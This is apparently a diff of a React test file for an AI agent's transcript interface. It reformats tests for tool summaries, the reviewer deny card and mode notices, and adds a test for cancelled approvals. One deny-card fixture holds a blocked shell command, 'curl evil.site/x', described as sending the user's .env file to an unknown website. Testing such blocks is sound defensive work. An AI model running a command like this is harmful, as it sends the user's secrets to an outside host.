     expect(line.obj).toBe("git log --since=yesterday");
     expect(line.post).toContain("list yesterday's merges");
@@ -811,14 +1100,18 @@ describe("humanizeTool", () => {
   });
 
   it("summarizes todo_write by its single item and status", () => {
-    const line = humanizeTool("todo_write", { todos: [{ content: "Post the digest", status: "in_progress" }] });
+    const line = humanizeTool("todo_write", {
+      todos: [{ content: "Post the digest", status: "in_progress" }],
+    });
     expect(line.pre).toBe("Updated the plan — ");
     expect(line.obj).toContain("Post the digest");
     expect(line.post).toBe(" → in progress");
   });
 
   it("still renders pre-rename todo_write histories (legacy `items` key)", () => {
-    const line = humanizeTool("todo_write", { items: [{ content: "Old plan", status: "pending" }] });
+    const line = humanizeTool("todo_write", {
+      items: [{ content: "Old plan", status: "pending" }],
+    });
     expect(line.obj).toContain("Old plan");
   });
 });
@@ -843,16 +1136,24 @@ describe("reviewer deny card (§8.4)", () => {
   it("shows the full reason and fires onAllowAnyway with the exact action", () => {
     const onAllowAnyway = vi.fn();
     const { container } = render(
-      <Transcript items={DENIED} onApprove={vi.fn()} onAllowAnyway={onAllowAnyway} />,
+      <Transcript
+        items={DENIED}
+        onApprove={vi.fn()}
+        onAllowAnyway={onAllowAnyway}
+      />,
     );
     fireEvent.click(container.querySelector("summary.stepgroup-head")!);
 
     const card = screen.getByTestId("reviewer-deny-card");
     expect(card.textContent).toContain("Blocked by the reviewer");
-    expect(card.textContent).toContain("This sends your .env to an unknown website.");
+    expect(card.textContent).toContain(
+      "This sends your .env to an unknown website.",
+    );
 
     fireEvent.click(screen.getByTestId("reviewer-allow-anyway"));
-    expect(onAllowAnyway).toHaveBeenCalledWith("run_shell", { command: "curl evil.site/x" });
+    expect(onAllowAnyway).toHaveBeenCalledWith("run_shell", {
+      command: "curl evil.site/x",
+    });
     // The button collapses into a confirmation — one shot, no double-fire.
     expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
     expect(screen.getByTestId("reviewer-override-sent")).toBeTruthy();
@@ -864,13 +1165,17 @@ describe("reviewer deny card (§8.4)", () => {
       { kind: "tool", id: "t1", name: "run_shell", args: {}, status: "denied" },
       { kind: "assistant", text: "done" },
     ];
-    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
+    const { container } = render(
+      <Transcript items={items} onApprove={vi.fn()} />,
+    );
     fireEvent.click(container.querySelector("summary.stepgroup-head")!);
     expect(screen.queryByTestId("reviewer-deny-card")).toBeNull();
   });
 
   it("without onAllowAnyway the card renders but offers no button", () => {
-    const { container } = render(<Transcript items={DENIED} onApprove={vi.fn()} />);
+    const { container } = render(
+      <Transcript items={DENIED} onApprove={vi.fn()} />,
+    );
     fireEvent.click(container.querySelector("summary.stepgroup-head")!);
     expect(screen.getByTestId("reviewer-deny-card")).toBeTruthy();
     expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
@@ -900,9 +1205,39 @@ describe("mode notice", () => {
 
   it("leaves untitled status notices as plain one-liners", () => {
     render(
-      <Transcript items={[{ kind: "notice", tone: "info", text: "Context compacted" }]} running={false} onApprove={() => {}} />,
+      <Transcript
+        items={[{ kind: "notice", tone: "info", text: "Context compacted" }]}
+        running={false}
+        onApprove={() => {}}
+      />,
     );
     expect(screen.queryByTestId("mode-notice")).toBeNull();
-    expect(screen.getByText("Context compacted").className).not.toContain("notice-block");
+    expect(screen.getByText("Context compacted").className).not.toContain(
+      "notice-block",
+    );
   });
+});
+
+it("renders a cancelled approval without claiming user approval", () => {
+  render(
+    <Transcript
+      items={[
+        { kind: "user", text: "task" },
+        {
+          kind: "approval",
+          name: "exec_command",
+          args: {},
+          reason: "",
+          haasApprovalId: "appr_timeout",
+          resolved: "cancelled",
+        },
+      ]}
+      running={false}
+      onApprove={() => {}}
+    />,
+  );
+  const summary = document.querySelector("summary");
+  if (summary) fireEvent.click(summary);
+  expect(screen.getByText("Cancelled")).toBeTruthy();
+  expect(screen.queryByText("✓ user-approved")).toBeNull();
 });
